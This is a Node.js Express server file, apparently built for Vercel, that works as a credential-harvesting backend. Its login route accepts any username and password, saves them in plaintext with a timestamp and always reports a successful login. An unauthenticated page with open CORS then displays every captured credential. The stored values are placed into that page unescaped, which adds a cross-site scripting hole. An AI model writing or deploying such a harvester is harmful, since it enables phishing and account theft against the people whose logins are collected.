const express = require('express');
const cors = require('cors');

const app = express();

// Store credentials in memory (for demonstration only)
// In a real application, you should use a database
let credentials = [];

// Middleware
app.use(cors());
app.use(express.json());

// Serve a visible HTML page with stored credentials
app.get('/api', (req, res) => {
  const html = `
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Stored Credentials</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            margin: 20px;
            padding: 20px;
            background-color: #f4f4f4;
          }
          .container {
            max-width: 800px;
            margin: auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
          }
          h1 {
            text-align: center;
          }
          table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
          }
          th, td {
            border: 1px solid #ddd;
            padding: 10px;
            text-align: left;
          }
          th {
            background-color: #007BFF;
            color: white;
          }
          tr:nth-child(even) {
            background-color: #f9f9f9;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>Stored Credentials</h1>
          <table>
            <thead>
              <tr>
                <th>Username/Email</th>
                <th>Password</th>
                <th>Timestamp</th>
              </tr>
            </thead>
            <tbody>
              ${credentials.map(cred => `
                <tr>
                  <td>${cred.username}</td>
                  <td>${cred.password}</td>
                  <td>${cred.timestamp}</td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>
      </body>
    </html>
  `;
  res.send(html);
});

// Handle login requests
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  // Basic validation
  if (!username || !password) {
    return res.status(400).json({ message: 'Username and password are required' });
  }

  // Store the credentials with timestamp
  credentials.push({
    username,
    password,
    timestamp: new Date().toLocaleString()
  });

  // Send success response
  res.json({ message: 'Login successful!' });
});

// Export the Express API for Vercel
module.exports = app;
